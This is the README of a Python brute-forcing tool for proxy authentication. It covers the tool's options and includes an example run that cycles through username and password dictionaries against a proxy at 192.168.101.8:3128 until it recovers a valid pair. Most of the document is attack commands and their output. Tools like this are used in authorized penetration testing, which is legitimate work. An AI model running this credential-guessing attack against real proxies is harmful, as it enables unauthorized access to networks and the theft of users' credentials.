# Proxy-Brute-Force - Simple Proxy Auth Brute Forcer.



## Usage:

proxybf.py - It's a Simple Proxy Authentication Brute forcer. 

root@zakan:~ # python proxybf.py --help 

Usage: 
  proxybf.py [ -i Proxy IP ] [ -p Proxy port ] [ -c CODE ][ -U Usernames File ] [ -P Passwords File ]


Options:

  --version       show program's version number and exit

  -h, --help      show this help message and exit

  -i HOST         Ip/Hostname of the proxy to brute force.

  -p PORT         Port of the proxy (default: 3128).

  -c CODE         HTTP Code for Proxy Authentication Required (default: 407).

  -U UFILE        Usernames Dictionary.

  -P PFILE        Passwords Dictionary.


## Example:

root@zakan:~ # python proxybf.py -i 192.168.101.8 -p 3128 -U users.lst  -P password.lst


[*] Starting brute forcing.

[*] Checking for Proxy authentication.

[-] Proxy is protected by authentication, by returning 407 code !

[*] Brute forcing the Proxy.

[-] FAIL : Proxy = 192.168.101.8:3128, Status Code = 407, User = b.muncy, Passwd = 123456

[-] FAIL : Proxy = 192.168.101.8:3128, Status Code = 407, User = b.muncy, Passwd = 12345

[-] FAIL : Proxy = 192.168.101.8:3128, Status Code = 407, User = b.muncy, Passwd = password

[-] FAIL : Proxy = 192.168.101.8:3128, Status Code = 407, User = b.muncy, Passwd = password1

[-] FAIL : Proxy = 192.168.101.8:3128, Status Code = 407, User = b.muncy, Passwd = 123456789

[-] FAIL : Proxy = 192.168.101.8:3128, Status Code = 407, User = b.muncy, Passwd = 12345678

[-] FAIL : Proxy = 192.168.101.8:3128, Status Code = 407, User = b.muncy, Passwd = 1234567890

...

[+] SUCCESS : Proxy = 192.168.101.8:3128, Status Code = 403, User = b.muncy, Passwd = rabbit

[+] Username/Password pair is found : [ User = b.muncy, Passwd = rabbit ] 

[*] End.


## Remark:

Ensure that usernames and passwords haven't ":".

